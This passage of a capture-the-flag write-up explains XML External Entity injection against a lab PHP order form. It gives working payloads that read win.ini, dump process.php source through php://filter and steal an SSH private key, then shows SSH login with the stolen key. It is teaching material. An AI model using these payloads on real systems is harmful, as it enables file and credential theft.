## 4. Exploitation: XML External Entity (XXE) Injection

### 4.1 What XXE actually is (for readers new to this)

XML lets you define custom "entities" — essentially reusable placeholders — inside a `<!DOCTYPE>` declaration. Normally these are used for harmless things like inserting a repeated piece of text. But if the entity's value is defined as `SYSTEM "file:///some/path"`, and the XML parser is configured to resolve external entities, the parser will **read that file from the server's disk and substitute its contents wherever the entity is referenced** — and if the application then reflects any part of the parsed document back to the user, you can read arbitrary files the web server process has permission to access.

This is exactly what happened here.

### 4.2 First attempt (and why it failed)

My first payload replaced the entire original document structure instead of working within it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

This produced a PHP error rather than the file contents:

```
Warning: DOMDocument::loadXML(): Extra content at the end of the document...
Notice: Trying to get property 'quantity' of non-object...
```

**Why this failed, and why the error was still useful:** the application's backend code (which I later recovered — see Section 4.4) expects the submitted XML to still contain `<order>`, `<quantity>`, `<item>`, and `<address>` elements, because it explicitly reads `$order->quantity`, `$order->item`, etc. after parsing. My payload replaced the whole structure with `<r>&xxe;</r>`, so those properties didn't exist on the resulting object — hence "Trying to get property of non-object." Critically though, **the DOCTYPE and entity declaration parsed without complaint**, which confirmed the parser *was* processing external entities — I just wasn't injecting the payload in a way the rest of the application could use.

**The lesson:** when working with XXE against a real application (as opposed to a generic textbook POC), you generally need to **preserve the application's expected document structure** and inject your entity into an *existing* field, not invent new top-level elements.

### 4.3 Working payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>whatever street</address>
</order>
```

This returned the contents of `win.ini` reflected back inside the application's normal "Your order for [item] has been processed" response — confirming full, in-band, readable XXE.

**Two mistakes I made and want to flag explicitly, because I made both of them again by accident on a later replay of the box:**

1. **Forgetting the `SYSTEM` keyword.** `<!ENTITY xxe "file:///...">` (without `SYSTEM`) defines an *internal* entity whose value is literally that string of text — it does **not** fetch a file. `SYSTEM` is what tells the parser "the value of this entity lives at this external location, go fetch it."
2. **Using backslashes instead of forward slashes** in the file path (`C:\Users\...` instead of `C:/Users/...`). Even though the target OS is Windows, the value inside a `file://` URI needs to follow **URI syntax**, not Windows path syntax — and URI syntax uses forward slashes universally, regardless of the underlying operating system. Backslashes in a URI are either invalid or get interpreted as escape characters, which breaks the lookup.

### 4.4 Reading the application's own source code

Once file read was confirmed, I wanted to understand the application's logic itself, not just guess at file paths. Directly reading `.php` files via `file://` doesn't work well, because the **web server executes PHP files rather than serving their raw text** — so a normal `file://` read would just show you the *output* of the script, or nothing useful, not the source code.

The fix is PHP's **`php://filter`** wrapper, which can be chained with `convert.base64-encode` to return a file's raw source as base64 text *before* PHP ever executes it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=C:/xampp/htdocs/process.php">]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>whatever street</address>
</order>
```

Decoding the returned base64 revealed `process.php`:

```php
<?php
include("db.php");
session_start();
if (!$_SESSION["loggedin"]) {
    header('location: /index.php');
} else {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        libxml_disable_entity_loader(false);
        $xmlfile = file_get_contents('php://input');
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $order = simplexml_import_dom($dom);
        $quantity = $order->quantity;
        $item = $order->item;
        $addr = $order->address;
        echo "Your order for $item has been processed";
    }
}
```

**This is the root cause of the entire vulnerability**, in one line:

```php
libxml_disable_entity_loader(false);
```

This call explicitly **enables** external entity loading. Combined with the `LIBXML_NOENT | LIBXML_DTDLOAD` flags on `loadXML()` — which tell the parser to substitute entities and load external DTDs — the application is deliberately configured in the least safe way possible for handling untrusted XML input.

### 4.5 Escalating to the SSH private key

Earlier, browsing the site's HTML source had revealed a developer comment: `<!-- Modified by Daniel : UI-Fix-9092-->`. Combined with knowing this was a Windows box, that gave a strong candidate path for an SSH key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa">]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>whatever street</address>
</order>
```

This returned a complete `OPENSSH PRIVATE KEY` block. I saved it locally and used it to authenticate over SSH as `daniel`:

```bash
chmod 400 id_rsa
ssh -i id_rsa daniel@10.129.95.192
```

**Why `chmod 400` matters:** SSH clients enforce that a private key file is not readable by anyone other than its owner (`400` = owner can read, no one else has any access). If a key's permissions are too open, `ssh` will refuse to use it entirely:

```
@ WARNING: UNPROTECTED PRIVATE KEY FILE! @
Permissions 0664 for 'id_rsa' are too open.
```

This isn't a server-side check — it's the **client** protecting you, on the assumption that a world-readable private key file is a sign the key may have already been exposed to other users/processes on the same machine.

This authenticated me as `daniel` and gave me the user flag:

```
type C:\Users\daniel\Desktop\user.txt
[REDACTED]
```

